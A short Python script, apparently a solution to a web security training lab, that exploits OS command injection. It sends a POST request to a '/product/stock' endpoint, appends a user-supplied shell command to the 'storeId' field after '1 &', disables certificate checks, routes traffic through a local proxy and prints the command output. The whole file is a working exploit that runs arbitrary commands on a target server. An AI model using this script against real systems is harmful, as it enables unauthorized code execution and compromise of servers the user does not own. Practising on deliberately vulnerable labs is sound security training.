import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}




def run_cmd_injection(url, cmd):
    stock_path = "/product/stock"
    cmd_injection = '1 &' + cmd
    data = {'productId': '1', 'storeId': cmd_injection}
    r = requests.post(url + stock_path, data=data, verify=False, proxies=proxies)
    if r.status_code == 200 and len(r.text) > 0:
        print("[+] command injection successful")
        print(r.text)
    else:
        print(f"[-] command injection failed: {r.status_code}")
        print(r.text.strip())
        

def main():
    if len(sys.argv) != 3:
        print(f"usage: python {sys.argv[0]} <url> <cmd>")
        sys.exit(1)
    url = sys.argv[1]
    cmd = sys.argv[2]
    print("exploiting cmd injection")
    run_cmd_injection(url, cmd)


if __name__ == "__main__":
    main()